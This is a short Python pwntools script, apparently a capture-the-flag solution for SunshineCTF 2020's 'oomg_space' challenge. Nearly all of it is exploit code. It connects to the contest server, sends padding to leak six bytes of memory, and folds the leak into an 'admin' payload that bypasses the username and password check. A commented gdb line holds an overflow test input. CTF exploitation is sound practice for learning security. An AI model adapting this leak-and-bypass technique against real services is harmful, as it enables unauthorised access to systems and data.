#!/usr/bin/python2
#coding: utf-8

from pwn import *

context.terminal = ['urxvt', '-e', 'sh', '-c']

#p = process("./oomg_space2")
p = remote("chal.2020.sunshinectf.org",20004) # OR 20001 for first chall lol
print(p.recvuntil("USER\n"))

p.send(b"A"*16)

print(p.recvuntil(b"AAAAAAAAAAAAAAAA"))
#print(hex(u64(p.recv(6)+b"\x00\x00")))

leak = p.recv(6)[::-1]

print(leak)

payload = b"admin"+b"\x00"*11+b"\x00\x00"+leak
"""
gdb-peda$ r < <(python2 -c 'print(b"admin"+b"\x00"*11+b"\x00\x00\x55\x55\x55\x55\x80\x40"+"A"*0xffff)')
"""

print(payload)
p.recvuntil("USER\n")

p.send(payload)

print(p.recvuntil("PASSWORD\n"))

p.send("AAAA")

print(p.recvline())
print(p.recvline())
